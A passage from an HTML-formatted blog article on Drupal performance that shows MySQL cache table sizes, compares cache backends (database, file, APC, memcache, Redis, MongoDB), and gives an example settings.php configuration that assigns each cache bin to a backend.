
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mydrupal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_filter&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;06&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mydrupal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;cache&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mydrupal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_content&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mydrupal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_views&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mydrupal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_admin_menu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mydrupal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_page&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mydrupal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_views_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mydrupal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_block&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;K&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------------+-------+-------+---------+------------+---------+&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;rows&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So, well, here my example is a quite little website. Cache tables are small and not heavily used.
You would get bigger numbers on a big website.
But anyway, the real problem in term of performance here is not on the size of
caches or the size of the indexes, but on the number of read and write queries
running on theses tables.&lt;/p&gt;

&lt;p&gt;When the website will grow you will need to activate more internal caching,
maybe you will use good modules, which make their own cache tables and use them
&amp;amp; the existing ones to avoid recomputing all answers.
You may even use so much the cache that some queries on the website will be answered
by only requesting the cache table (aggressive cache mode with cache_page).&lt;/p&gt;

&lt;p&gt;Soon enough you will ask yourself &quot;Could I use some smarter solutions like Memcache for the cache storage?&quot;.&lt;/p&gt;

&lt;p&gt;And of course some existing modules could help you doing that.
The memcache module, for example.
And the &quot;cache router&quot; module applied some of the ideas we'll study later on this article.&lt;/p&gt;

&lt;p&gt;You may wonder why it is smart to use something which is not the database to perform the caching storage?&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;You could maybe avoid completely the database requests in aggressive mode&lt;/li&gt;
&lt;li&gt;Dedicated storage engine (cache engines) perform faster than a relational database both in write and read operations&lt;/li&gt;
&lt;li&gt;Reducing the number of requests made on MySQL is very important with Drupal, where a single page can be between 50 and 250 requests. With core modules only, adding Panels, some views and some other modules and you could grow up to 600 requests.&lt;/li&gt;
&lt;li&gt;data not managed in MySQl will never impact MySQL memory buffers management (smallest database will have more chances to avoid pagination)&lt;/li&gt;
&lt;li&gt;In some circumstances cache tables can get a lot of write operations and the query_cache for queries on theses tables will be wiped out frequently, which is bad for the query cache ratio and usage. But this is not always true, depends a lot on your Drupal cache usages&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;I said before cache engines can be faster in both write and read operations.
So now you may ask &quot;why don't we use Cache engines for everything?&quot;. And the answer is that a relational database provides more services, it can for example provides a better persitency,
or manage better simultaneous writes, or allow handling relationship between objects.
&lt;strong&gt;Use the right tool for the right thing&lt;/strong&gt;.
But this is still a good question. Drupal 8 studies &amp;amp; discussions are actually requesting whether a document based backend for most Drupal storage wouldn't be  more appropriate than a relational database.
For now we'll just have a look at the cache tables problems.&lt;/p&gt;

&lt;h3&gt;Cache backends with Drupal7&lt;/h3&gt;

&lt;p&gt;Now comes Drupal7. The cache management has been rewritten, using cache router and memcached ideas and try to put the things one step further in the core.
Cache bins are used, for example the bin &lt;strong&gt;'foo'&lt;/strong&gt; will use the cache table &lt;strong&gt;cache_foo&lt;/strong&gt;.
And &lt;strong&gt;for each bin you can specify which storage backend will be used&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Available cache backends are:&lt;/p&gt;
 * Database: the default one, like before
 * File (module filecache): a file-based storage which could be useful with fast disk storage (and a shared disk storage if you have several apache servers)
 * Apc (module apc): APC is not only an opcode (PHP code precompiler) it also  provides a local cache of shared memory. If you have several Apache servers you will have one APC cache per server, but it's not a big one, be careful (and part of the available memory space is occupied by the opcode). In case of full cache (overflow) the cache is completely wiped out, so do not use that for long persistency.
 * Memcache (module memcache): To use the well known memcached daemon. where you could use a basic mono-server setting or a complex multi-servers with replications usage&lt;/p&gt;

&lt;p&gt;But other backends could be written.
And you can already find two Redis backends implementations (&lt;strong&gt;Predis&lt;/strong&gt; &amp;amp; &lt;strong&gt;PhpRedis&lt;/strong&gt;) with the  &lt;a href=&quot;http://drupal.org/project/redis&quot;&gt;redis module&lt;/a&gt; (alpha).
Module maintained by &lt;strong&gt;pounard&lt;/strong&gt;, a Makina Corpus worker.
There is also a &lt;a href=&quot;http://drupal.org/project/mongodb&quot;&gt;MongoDB module&lt;/a&gt; providing a mongodb cache backend (beta2), that I did not test yet, powered by Damien Tournoud.&lt;/p&gt;

&lt;h3&gt;Having a drupal6? Or do you want some configuration details?&lt;/h3&gt;

&lt;p&gt;The only thing we need know is a documentation on how to configure these.
This is always (almost) provided in the module documentation but we will use the &lt;a href=&quot;http://drupal.org/project/cache_backport&quot;&gt;cache backport module&lt;/a&gt; documentation as an example.
This module, again maintained by  &lt;strong&gt;pounard&lt;/strong&gt;, is a backport of Drupal7 cache engine (separating  backends) for Drupal6.
So it's a replacement for Cache Router where you can reuse the cache parts of Drupal7 cache backends in a Drupal6 website.
And One of the good points of this module is that it provides a centralized documentation on several cache backends which is spread on the different modules for Drupal7.&lt;/p&gt;

&lt;p&gt;The first question is &quot;where should I put each separate cache bin (or each cache table for short) ?&quot;&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;cache&lt;/strong&gt; and &lt;strong&gt;cache_bootstrap&lt;/strong&gt; bins contains short and often used data.
They will love the APC cache backend.&lt;/p&gt;

&lt;p&gt;For all the others bins you could apply a different policy.
You may want to keep some bins in the database, but you should test the memcached/mongodb backend for most bins.
You could also try the filecache backend, with a modern linux kernel often used files will get mapped into memory buffers and you may get good results.&lt;/p&gt;

&lt;p&gt;There is no magic rules, the best tool will depend on your cache usage and on used modules.
MySQL is already working a lot, moving all caches outside of the  database will help MySQL.
But you will need to allow some memory (server?) for these new backends, maybe some of the memory given previously to MySQl or Apache.
Keep in mind that you should never make a server swap.&lt;/p&gt;

&lt;p&gt;Let's look at a complete configuration, for Drupal6 the cache backport module would require these lines:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;// Load the cache backport replacement for cache.inc:&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_inc&amp;#39;] = &amp;#39;sites/all/modules/cache_backport/cache.inc&amp;#39;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And now for Drupal7 or Drupal6 we would have (of course it depends of the bins available on your installation, check the table created in MySQL to see what bin are requested by the modules):&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;// Define cache engines:&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Database : &amp;#39;DrupalDatabaseCache&amp;#39;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_backends&amp;#39;][] = &amp;#39;sites/all/modules/cache_backport/database.inc&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // FileCache : &amp;#39;DrupalFileCache&amp;#39;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_backends&amp;#39;][] = &amp;#39;sites/all/modules/filecache/filecache.inc&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // APC : &amp;#39;DrupalAPCCache&amp;#39;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_backends&amp;#39;][] = &amp;#39;sites/all/modules/apc/drupal_apc_cache.inc&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Memcache from drupal 7 : &amp;#39;MemCacheDrupal&amp;#39;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_backends&amp;#39;][] = &amp;#39;sites/all/modules/memcache/memcache.inc&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Define cache bins, here&amp;#39;s the magic, deporting several cache on the&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // appropriate place depending on usage frequency, size, and others:&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Please consider seriously doing brainstorming and benchmarking on your own&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // since this is only an example, and sites performance may vary depending&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // on modules and usage.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Cache name |  Usage/frequency/size&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // default    |  any/any/any          select memcache, apc, file or db&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_default_class&amp;#39;]          = &amp;#39;DrupalDatabaseCache&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // WARNING: this one is &amp;#39;cache_class_cache&amp;#39; and not &amp;#39;cache_class_cache_cache&amp;#39;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // general    |  all/every/medium     select memcache &amp;gt; file &amp;gt; apc &amp;gt; db&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache&amp;#39;]            = &amp;#39;MemCacheDrupal&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // bootstrap  |  all/every/medium     select apc &amp;gt; db&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_bootstrap&amp;#39;]  = &amp;#39;DrupalAPCCache&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // block      |  any/often/small      select memcache &amp;gt; db &amp;gt; file&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_block&amp;#39;]      = &amp;#39;MemCacheDrupal&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // field      |  page/some/large      select file &amp;gt; memcache &amp;gt; db&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_content&amp;#39;]    = &amp;#39;DrupalFileCache&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // filter     |  page/some/large      select file &amp;gt; memcache &amp;gt; db&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_filter&amp;#39;]     = &amp;#39;DrupalFileCache&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // form       |  edit/rare/medium     select file &amp;gt; memcache &amp;gt; db&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_form&amp;#39;]       = &amp;#39;DrupalFileCache&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // menu       |  any/often/large      select memcache &amp;gt; db &amp;gt; file&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_menu&amp;#39;]       = &amp;#39;MemCacheDrupal&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // page       |  page/often/large     select memcache &amp;gt; file &amp;gt; db&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_page&amp;#39;]       = &amp;#39;MemCacheDrupal&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // pathdst    |  any/some/medium      select memcache &amp;gt; db &amp;gt; file&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_pathdst&amp;#39;]    = &amp;#39;MemCacheDrupal&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // pathsrc    |  any/some/medium      select memcache &amp;gt; db &amp;gt; file&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_pathsrc&amp;#39;]    = &amp;#39;MemCacheDrupal&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // multiprice |  any/often/medium     select memcache &amp;gt; db &amp;gt; file&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_uc_price&amp;#39;]   = &amp;#39;MemCacheDrupal&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // update     |  system/rare/large,   select file &amp;gt; db&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_update&amp;#39;]     = &amp;#39;DrupalFileCache&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // users      |  any/some/large       select memcache &amp;gt; file &amp;gt; db&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_users&amp;#39;]      = &amp;#39;MemCacheDrupal&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // views      |  any/some/large       select memcache &amp;gt; file &amp;gt; db&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_views&amp;#39;]      = &amp;#39;MemCacheDrupal&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // views data |  any/often/small      select apc &amp;gt; db&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_class_cache_views_data&amp;#39;] = &amp;#39;DrupalAPCCache&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Define File Cache settings:&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // See README.TXT in FileCache directory for configuration details.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;filecache_fast_pagecache&amp;#39;] = TRUE; // set TRUE to enable fast page serving&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // you will need to define your $conf[&amp;#39;file_directory_temp&amp;#39;] = &amp;#39;/something/tmp&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // before using this line. Put the directory in a place where drupal can write&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // (tmp, or files subdirectory) but that is not available via direct web&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // access, default Drupal conf protects .ht* directories, so default name is&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // .ht.filecache in the files directory if you provide no value for this setting&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;filecache_directory&amp;#39;] = $conf[&amp;#39;file_directory_temp&amp;#39;] . DIRECTORY_SEPARATOR . &amp;#39;filecache&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Define APC settings.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;apc_show_debug&amp;#39;] = FALSE; // set TRUE to enable debug mode&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // TODO In order to use multiple Drupal instance on the same physical box,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // each site settings.php file should provide a bin name prefix for APC and&lt;/span&gt;
